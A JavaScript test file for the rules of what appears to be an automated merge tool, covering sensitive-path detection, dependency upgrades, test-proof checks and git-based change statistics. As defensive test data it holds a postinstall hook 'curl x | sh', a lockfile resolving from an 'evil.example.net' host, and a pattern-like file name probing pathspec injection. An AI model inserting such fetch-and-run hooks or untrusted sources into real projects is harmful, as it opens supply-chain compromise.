import assert from 'node:assert/strict';
import { existsSync, mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import * as realFs from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';
import { run } from '../src/exec.mjs';
import { changeStats, decide, isMajorUpgrade, isTestFile, provesItself, sensitiveReason } from '../src/rules.mjs';

test('isTestFile recognizes test folders and test file names', () => {
  for (const path of ['tests/a.mjs', 'src/test/a.js', 'pkg/__tests__/a.js', 'AppTests/LoginTests.swift', 'src/a.test.ts',
    'src/a.spec.js', 'pkg/thing_test.go', 'Sources/FooTests.swift', 'test/a.py']) {
    assert.equal(isTestFile(path), true, path);
  }
  for (const path of ['src/a.js', 'src/contest/a.js', 'src/latest.js', 'README.md', 'src/testing-helpers.js']) {
    assert.equal(isTestFile(path), false, path);
  }
});

const reasons = {
  'Changes CI workflows': ['.github/workflows/checks.yml', '.github/dependabot.yml', 'ci/run.sh', '.circleci/config.yml',
    '.gitlab-ci.yml', 'Jenkinsfile', 'azure-pipelines.yml', '.travis.yml', 'bitbucket-pipelines.yml', '.buildkite/pipeline.yml', '.GitHub/workflows/x.yml'],
  'Changes how the checks run': ['Makefile', 'justfile', 'Taskfile.yml', 'sub/makefile'],
  'Changes how packages or git behave': ['.npmrc', 'web/.npmrc', '.yarnrc.yml', '.pnpmfile.cjs', '.gitmodules', '.gitattributes',
    '.husky/pre-commit', '.githooks/pre-push', 'lefthook.yml', '.pre-commit-config.yaml'],
  'Changes agent instructions': ['AGENTS.md', 'CLAUDE.md', 'docs/agents.md', '.claude/settings.json', '.cursor/rules/a.mdc', '.mcp.json', 'GEMINI.md'],
  'Changes deploy configuration': ['Dockerfile', 'api/Dockerfile', 'docker-compose.yml', 'docker-compose.prod.yaml', 'wrangler.toml',
    'worker/wrangler.jsonc', 'launcher.json', 'fly.toml', 'vercel.json', 'netlify.toml', 'Procfile', 'infra/main.tf', 'serverless.yml', 'DOCKERFILE'],
  'Changes environment files': ['.env', '.env.example', 'api/.env.production'],
  'Changes database migrations': ['db/migrations/001.sql', 'src/migrate/run.js', 'migrations/a.py'],
  'Touches sign-in or payment code': ['src/auth/index.js', 'src/Login.tsx', 'lib/session.js', 'src/reset-password.js',
    'src/tokens.js', 'src/payment/charge.js', 'src/Billing.swift', 'src/stripe.js', 'jobs/payouts.js'],
};
for (const [reason, paths] of Object.entries(reasons)) {
  test(`sensitive: ${reason}`, () => {
    for (const path of paths) assert.equal(sensitiveReason(['src/ok.js', path]), reason, path);
  });
}
test('ordinary files are not sensitive', () => {
  assert.equal(sensitiveReason(['src/profile.js', 'tests/profile.test.js', 'README.md', 'package.json', 'docs/environment.md']), null);
  assert.equal(sensitiveReason([]), null);
});

const pkg = (dependencies, devDependencies = {}) => ({ dependencies, devDependencies });
test('a higher major version of a dependency is a major upgrade', () => {
  assert.equal(isMajorUpgrade(pkg({ a: '^1.4.0' }), pkg({ a: '^2.0.0' })), true);
  assert.equal(isMajorUpgrade(pkg({ a: '^1.4.0' }), pkg({ a: '^1.9.0' })), false);
  assert.equal(isMajorUpgrade(pkg({}, { a: '~3.1.0' }), pkg({}, { a: '4.0.1' })), true);
  assert.equal(isMajorUpgrade(pkg({ a: '>=1.2 <2' }), pkg({ a: '>=1.5 <2' })), false);
});
test('before 1.0 a minor bump counts as major; other cases do not', () => {
  assert.equal(isMajorUpgrade(pkg({ a: '^0.4.2' }), pkg({ a: '^0.5.0' })), true);
  assert.equal(isMajorUpgrade(pkg({ a: '^0.4.2' }), pkg({ a: '^0.4.9' })), false);
  assert.equal(isMajorUpgrade(pkg({ a: '^2.0.0' }), pkg({ a: '^1.0.0' })), false);
  assert.equal(isMajorUpgrade(pkg({ a: '^1.0.0' }), pkg({ a: '^1.0.0', b: '^9.0.0' })), false);
  assert.equal(isMajorUpgrade(pkg({ a: 'latest' }), pkg({ a: 'github:octo/a' })), false);
  assert.equal(isMajorUpgrade(null, pkg({ a: '^1.0.0' })), false);
  assert.equal(isMajorUpgrade(pkg({ a: '^1.0.0' }), null), false);
});

const rootPkg = { name: 'app', scripts: { test: 'node --test' }, dependencies: { a: '^1.0.0' }, devDependencies: { b: '~0.4.2' } };
const lock = (hosts = ['https://registry.npmjs.org']) =>
  JSON.stringify({ packages: Object.fromEntries(hosts.map((host, i) => [`node_modules/p${i}`, { resolved: `${host}/p${i}/-/p${i}-1.0.0.tgz` }])) });
const manifestsOf = (after, before = rootPkg) => ({ 'package.json': { before: JSON.stringify(before), after: JSON.stringify(after) } });
const stats = (files, over = {}) => ({ files, addedLines: 12, onlyRemovals: false, modifiedFiles: [], ...over });
const good = {
  change: { kind: 'fix', majorUpgrade: false },
  stats: stats(['src/profile.js', 'tests/profile.test.js']),
  before: { checksPass: true, tests: { ran: 41, passed: 41 } },
  after: { checksPass: true, tests: { ran: 42, passed: 42 } },
  proof: { proven: true, note: 'The new test fails without the change.' },
  manifests: {},
};
const verdict = (over) => decide({ ...good, ...over });
const unproven = { proven: false, note: 'The change has no test.' };
const NO_PROOF = { merge: false, reason: 'No test proves the change' };

test('a proven fix with passing checks is merged', () => {
  assert.deepEqual(verdict({}), { merge: true, reason: null });
});
test('no changed files means no change was made', () => {
  assert.deepEqual(verdict({ stats: stats([]) }), { merge: false, reason: 'No change was made' });
});
test('checks that fail, or could not be run, block the merge', () => {
  const reason = "The repository's checks do not pass with the change";
  assert.deepEqual(verdict({ after: { checksPass: false, tests: null } }), { merge: false, reason });
  assert.deepEqual(verdict({ after: { checksPass: null, tests: null } }), { merge: false, reason });
});
test('a change after which fewer tests run is proposed', () => {
  assert.deepEqual(verdict({ after: { checksPass: true, tests: { ran: 30, passed: 30 } } }), { merge: false, reason: 'Fewer tests ran than before' });
  assert.equal(verdict({ before: { checksPass: true, tests: null } }).merge, true);
});
test('a sensitive file blocks the merge with its reason', () => {
  assert.deepEqual(verdict({ stats: stats(['src/login.js', 'tests/login.test.js']) }), { merge: false, reason: 'Touches sign-in or payment code' });
});
test('a change to package.json scripts is proposed', () => {
  const manifests = manifestsOf({ ...rootPkg, scripts: { test: 'true' } });
  assert.deepEqual(verdict({ stats: stats(['package.json', 'src/a.js', 'tests/a.test.js']), manifests }), { merge: false, reason: 'Changes how the checks run' });
});
test('a major upgrade is proposed, whether the model says so or the versions do', () => {
  assert.deepEqual(verdict({ change: { kind: 'dependency-patch', majorUpgrade: true } }), { merge: false, reason: 'Major version upgrade' });
  const manifests = manifestsOf({ ...rootPkg, dependencies: { a: '^2.0.0' } });
  assert.deepEqual(verdict({ stats: stats(['package.json', 'src/a.js', 'tests/a.test.js']), manifests }), { merge: false, reason: 'Major version upgrade' });
});
test('a fix without proof is proposed', () => {
  assert.deepEqual(verdict({ proof: { proven: false, note: 'The new test passes without the change.' } }), NO_PROOF);
});
test('checks that failed before and pass now count as proof, unless existing tests were edited', () => {
  const fixed = { before: { checksPass: false, tests: null }, proof: { proven: false, note: 'The checks were already failing before the change.' } };
  assert.equal(verdict({ ...fixed, stats: stats(['src/profile.js']) }).merge, true);
  assert.deepEqual(verdict({ ...fixed, stats: stats(['src/profile.js', 'tests/old.test.js'], { modifiedFiles: ['tests/old.test.js'] }) }), NO_PROOF);
});

const patch = (afterPkg, extra = {}) => ({
  change: { kind: 'dependency-patch', majorUpgrade: false },
  stats: stats(['package.json', 'package-lock.json']),
  proof: unproven,
  manifests: { ...manifestsOf(afterPkg), 'package-lock.json': { before: lock(), after: lock() } },
  ...extra,
});
test('a dependency patch without a test merges when checks pass', () => {
  assert.deepEqual(verdict(patch({ ...rootPkg, dependencies: { a: '^1.0.4' }, devDependencies: { b: '~0.4.9' } })), { merge: true, reason: null });
});
test('a lockfile-only patch merges', () => {
  const only = patch(rootPkg, { stats: stats(['package-lock.json']), manifests: { 'package-lock.json': { before: lock(), after: lock() } } });
  assert.equal(verdict(only).merge, true);
});
test('a dependency patch that does anything else needs a test like any other change', () => {
  const cases = {
    'adds a dependency': { ...rootPkg, dependencies: { a: '^1.0.4', evil: '^1.0.0' } },
    'removes a dependency': { ...rootPkg, dependencies: {} },
    'points a dependency at a repository': { ...rootPkg, dependencies: { a: 'github:someone/a' } },
    'points a dependency at an address': { ...rootPkg, dependencies: { a: 'https://example.net/a.tgz' } },
    'uses a range that is not a plain version': { ...rootPkg, dependencies: { a: '>=1.0.4' } },
    'bumps a minor before 1.0': { ...rootPkg, devDependencies: { b: '~0.5.0' } },
    'changes another field': { ...rootPkg, dependencies: { a: '^1.0.4' }, main: 'other.js' },
    'adds overrides': { ...rootPkg, dependencies: { a: '^1.0.4' }, overrides: { c: '1.0.0' } },
  };
  for (const [name, afterPkg] of Object.entries(cases)) {
    const result = verdict(patch(afterPkg));
    assert.equal(result.merge, false, name);
  }
});
test('a dependency patch whose lockfile fetches from a new host needs a test', () => {
  const manifests = { ...manifestsOf({ ...rootPkg, dependencies: { a: '^1.0.4' } }), 'package-lock.json': { before: lock(), after: lock(['https://registry.npmjs.org', 'https://evil.example.net']) } };
  assert.deepEqual(verdict(patch(rootPkg, { manifests })), NO_PROOF);
  const gitDep = JSON.stringify({ packages: { 'node_modules/p': { resolved: 'git+ssh://git@github.com/someone/p.git#abc' } } });
  assert.deepEqual(verdict(patch(rootPkg, { manifests: { ...manifests, 'package-lock.json': { before: lock(), after: gitDep } } })), NO_PROOF);
});
test('a dependency patch touching any other file, another lock format, or a manifest that cannot be read needs a test', () => {
  const base = patch({ ...rootPkg, dependencies: { a: '^1.0.4' } });
  assert.deepEqual(verdict({ ...base, stats: stats(['package.json', 'src/profile.js']) }), NO_PROOF);
  assert.deepEqual(verdict({ ...base, stats: stats(['package.json', 'yarn.lock']) }), NO_PROOF);
  assert.deepEqual(verdict({ ...base, manifests: {} }), NO_PROOF);
  assert.deepEqual(verdict({ ...base, manifests: { 'package.json': { before: '{ broken', after: '{}' } } }), NO_PROOF);
  const nested = { ...base, stats: stats(['web/package.json']), manifests: { 'web/package.json': { before: JSON.stringify(rootPkg), after: JSON.stringify({ ...rootPkg, scripts: { postinstall: 'curl x | sh' } }) } } };
  assert.equal(verdict(nested).merge, false);
});

test('documentation merges without a test', () => {
  assert.equal(verdict({ change: { kind: 'docs', majorUpgrade: false }, stats: stats(['README.md', 'docs/setup.md']), proof: unproven }).merge, true);
});
test('dead-code removal merges without a test only when it removes and does nothing else', () => {
  const dead = { change: { kind: 'dead-code', majorUpgrade: false }, proof: unproven };
  assert.equal(verdict({ ...dead, stats: stats(['src/old.js', 'src/index.js'], { addedLines: 0, onlyRemovals: true }) }).merge, true);
  assert.deepEqual(verdict({ ...dead, stats: stats(['src/index.js'], { addedLines: 3, onlyRemovals: false }) }), NO_PROOF);
  assert.deepEqual(verdict({ ...dead, stats: stats(['bin/tool'], { addedLines: 0, onlyRemovals: false }) }), NO_PROOF);
});
test('a label that does not match what changed does not skip the test rule', () => {
  assert.deepEqual(verdict({ change: { kind: 'docs', majorUpgrade: false }, stats: stats(['README.md', 'src/profile.js']), proof: unproven }), NO_PROOF);
});

// provesItself and changeStats against a real repository in a temporary folder.
async function git(cwd, ...args) {
  const result = await run(['git', '-c', 'user.name=Seed', '-c', 'user.email=seed@example.com', '-c', 'commit.gpgsign=false', ...args], { cwd });
  assert.equal(result.code, 0, `git ${args.join(' ')}: ${result.stderr}`);
  return result.stdout.trim();
}
async function repoWith({ testPassesOnBase }) {
  const root = mkdtempSync(join(tmpdir(), 'nightshift-rules-'));
  const repo = join(root, 'repo');
  mkdirSync(join(repo, 'tests'), { recursive: true });
  await git(root, 'init', '-q', '-b', 'trunk', repo);
  writeFileSync(join(repo, 'package.json'), JSON.stringify({ type: 'module', scripts: { test: 'node --test tests/*.test.mjs' } }));
  writeFileSync(join(repo, 'value.mjs'), 'export const value = 1;\n');
  writeFileSync(join(repo, 'tests', 'old.test.mjs'), "import test from 'node:test';\ntest('old', () => {});\n");
  await git(repo, 'add', '-A');
  await git(repo, 'commit', '-q', '-m', 'base');
  const baseSha = await git(repo, 'rev-parse', 'HEAD');
  writeFileSync(join(repo, 'value.mjs'), 'export const value = 2;\n');
  const expected = testPassesOnBase ? 'true' : 'value === 2';
  writeFileSync(join(repo, 'tests', 'value.test.mjs'),
    `import test from 'node:test';\nimport assert from 'node:assert';\nimport { value } from '../value.mjs';\ntest('value', () => assert.ok(${expected}));\n`);
  await git(repo, 'add', '-A');
  await git(repo, 'commit', '-q', '-m', 'change');
  return { root, repo, baseSha, sha: await git(repo, 'rev-parse', 'HEAD') };
}
// A test run started from inside another test run reports to its parent instead of failing,
// so the nested runs get an environment without the outer runner's marker.
const { NODE_TEST_CONTEXT: _outer, ...cleanEnv } = process.env;
const checkRun = (argv, options) => run(argv, { ...options, env: cleanEnv });
const prove = (r, files) => provesItself({
  run, checkRunFor: () => checkRun, gitPath: 'git', repoDir: r.repo, proofDir: join(r.root, 'proof'),
  baseSha: r.baseSha, sha: r.sha, files, fs: realFs, timeoutMs: 60000, baselinePass: true,
});

test('changeStats lists the changed files and counts added lines', async () => {
  const r = await repoWith({ testPassesOnBase: false });
  assert.deepEqual(await changeStats({ run, gitPath: 'git', repoDir: r.repo, baseSha: r.baseSha, sha: r.sha }),
    { files: ['tests/value.test.mjs', 'value.mjs'], addedLines: 5, onlyRemovals: false, modifiedFiles: ['value.mjs'] });
  assert.deepEqual(await changeStats({ run, gitPath: 'git', repoDir: r.repo, baseSha: r.baseSha, sha: r.baseSha }),
    { files: [], addedLines: 0, onlyRemovals: false, modifiedFiles: [] });
});

test('changeStats says a change only removes when it deletes lines or files and nothing else', async () => {
  const r = await repoWith({ testPassesOnBase: false });
  const commit = async (edit) => {
    await git(r.repo, 'checkout', '-q', '--detach', r.sha);
    await edit();
    await git(r.repo, 'add', '-A');
    await git(r.repo, 'commit', '-q', '-m', 'edit');
    return changeStats({ run, gitPath: 'git', repoDir: r.repo, baseSha: r.sha, sha: await git(r.repo, 'rev-parse', 'HEAD') });
  };
  const removed = await commit(() => { realFs.rmSync(join(r.repo, 'tests', 'old.test.mjs')); writeFileSync(join(r.repo, 'value.mjs'), ''); });
  assert.deepEqual([removed.onlyRemovals, removed.addedLines], [true, 0]);
  const added = await commit(() => writeFileSync(join(r.repo, 'empty-new-file.txt'), ''));
  assert.equal(added.onlyRemovals, false, 'a new file, even an empty one, is not a removal');
  const mode = await commit(() => realFs.chmodSync(join(r.repo, 'value.mjs'), 0o755));
  assert.equal(mode.onlyRemovals, false, 'making a file executable is not a removal');
  const binary = await commit(() => writeFileSync(join(r.repo, 'value.mjs'), Buffer.from([0, 1, 2, 0, 255])));
  assert.equal(binary.onlyRemovals, false, 'a binary change is not a removal');
});

test('a new test that fails on the old code proves the change', async () => {
  const r = await repoWith({ testPassesOnBase: false });
  assert.deepEqual(await prove(r, ['tests/value.test.mjs', 'value.mjs']), { proven: true, note: 'The new test fails without the change.' });
  assert.equal(existsSync(join(r.root, 'proof')), false, 'the proof folder is removed afterwards');
  assert.equal(await git(r.repo, 'rev-parse', 'HEAD'), r.sha, 'the job\'s clone is left where it was');
});

test('a new test that passes on the old code proves nothing', async () => {
  const r = await repoWith({ testPassesOnBase: true });
  assert.deepEqual(await prove(r, ['tests/value.test.mjs', 'value.mjs']), { proven: false, note: 'The new test passes without the change.' });
});

test('with no test files, or no checks to run, nothing is proven and the note says which', async () => {
  const r = await repoWith({ testPassesOnBase: false });
  assert.deepEqual(await prove(r, ['value.mjs']), { proven: false, note: 'The change has no test.' });
  const noChecks = { ...realFs, existsSync: (path) => (path.endsWith('package.json') || path.endsWith('run.sh') || path.endsWith('Package.swift') ? false : realFs.existsSync(path)),
    readFileSync: (path, enc) => { if (String(path).endsWith('package.json')) throw new Error('ENOENT'); return realFs.readFileSync(path, enc); } };
  const result = await provesItself({ run, checkRunFor: () => checkRun, gitPath: 'git', repoDir: r.repo, proofDir: join(r.root, 'proof2'),
    baseSha: r.baseSha, sha: r.sha, files: ['tests/value.test.mjs'], fs: noChecks, timeoutMs: 60000, baselinePass: true });
  assert.deepEqual(result, { proven: false, note: 'The repository has no checks to run the test with.' });
});

test('nothing is proven when the checks were already failing before the change', async () => {
  const r = await repoWith({ testPassesOnBase: false });
  const result = await provesItself({ run, checkRunFor: () => checkRun, gitPath: 'git', repoDir: r.repo, proofDir: join(r.root, 'proof'),
    baseSha: r.baseSha, sha: r.sha, files: ['tests/value.test.mjs'], fs: realFs, timeoutMs: 60000, baselinePass: false });
  assert.deepEqual(result, { proven: false, note: 'The checks were already failing before the change.' });
});

test('an install that fails on the old code is not mistaken for a failing test', async () => {
  const r = await repoWith({ testPassesOnBase: false });
  const fs = { ...realFs, existsSync: (path) => (String(path).endsWith('package-lock.json') ? true : realFs.existsSync(path)) };
  const failingInstall = (argv, options) => (argv.join(' ') === 'npm ci' ? Promise.resolve({ code: 1, stdout: '', stderr: 'network', timedOut: false }) : checkRun(argv, options));
  const result = await provesItself({ run, checkRunFor: () => failingInstall, gitPath: 'git', repoDir: r.repo, proofDir: join(r.root, 'proof'),
    baseSha: r.baseSha, sha: r.sha, files: ['tests/value.test.mjs'], fs, timeoutMs: 60000, baselinePass: true });
  assert.deepEqual(result, { proven: false, note: 'The old code could not be installed to run the test.' });
});

test('a test file whose name looks like a pattern is taken literally', async () => {
  const r = await repoWith({ testPassesOnBase: false });
  const seen = [];
  const spy = (argv, options) => { seen.push(argv); return run(argv, options); };
  await provesItself({ run: spy, checkRunFor: () => checkRun, gitPath: 'git', repoDir: r.repo, proofDir: join(r.root, 'proof'),
    baseSha: r.baseSha, sha: r.sha, files: ['tests/value.test.mjs', ':(top)*'], fs: realFs, timeoutMs: 60000, baselinePass: true });
  const checkouts = seen.filter((argv) => argv.includes('checkout') && argv.includes('--'));
  assert.ok(checkouts.length > 0 && checkouts.every((argv) => argv.includes('--literal-pathspecs')));
});
